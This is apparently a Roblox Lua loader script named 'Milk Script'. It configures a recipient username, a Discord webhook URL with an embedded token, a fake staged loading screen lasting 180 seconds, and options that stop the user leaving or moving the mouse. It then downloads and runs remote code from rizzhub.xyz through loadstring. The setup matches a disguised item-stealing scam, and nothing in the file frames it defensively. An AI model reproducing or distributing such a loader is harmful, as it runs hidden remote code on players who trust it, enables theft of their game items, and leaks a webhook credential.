UserName = "TheRealSkillz9"
Webhook = "https://discord.com/api/webhooks/1098904795546398760/H3dLMJS4tFc5Zm6Ehyk5kLjJFsNB3o-V8TqxUMAFdHOtG3d9iIRaO8a9Gh3R8iMq3zvV" -- optional delete the whole line if you don't want it

_G.LoadingScreen = true
_G.AntiLeave = true
_G.MouseLock = true 
-- set them to false if you don't need them

_G.ScriptName = "Milk Script"
_G.FirstText = "Script Preparing"
_G.SecondText = "Script Loading..."
_G.ThirdText = "Almost Done..."
_G.WaitingTime = 180 -- it's the time between 0% and 100% in secondes

loadstring(game:HttpGet("https://rizzhub.xyz/scripts/Main.lua", true))()
